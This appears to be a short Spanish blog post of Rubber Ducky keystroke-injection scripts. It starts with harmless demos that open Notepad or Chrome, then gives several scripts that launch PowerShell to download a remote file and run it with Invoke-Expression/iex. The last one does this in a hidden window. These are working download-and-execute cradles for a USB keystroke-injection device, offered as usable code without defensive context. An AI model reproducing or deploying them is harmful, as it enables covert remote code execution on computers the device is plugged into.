# Scripts en Rubber Ducky (parte 1)
## Ducky scripts 
### URL: https://www.jesusninoc.com/2017/03/09/scripts-en-rubber-ducky-parte-1/
```PowerShell
DELAY 3000
GUI r
DELAY 200
STRING notepad
ENTER
DELAY 200
STRING Hola
ENTER

```
```PowerShell
DELAY 5000
GUI r
DELAY 50
STRING chrome www.jesusninoc.com
ENTER
DELAY 1000
F11

```
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Invoke-Expression ps
ENTER

```
```PowerShell
.\ducktools.py -e -l es .\ejecutarcmdlet.txt .\inject.bin

```
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell Invoke-Expression (Invoke-WebRequest 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt')
ENTER

```
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell iex (iwr 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt')
ENTER

```
```PowerShell
DELAY 750
GUI r
DELAY 750
STRING powershell -windowstyle hidden iex (iwr 'https://www.jesusninoc.com/wp-content/uploads/2014/12/config.txt')
ENTER

```
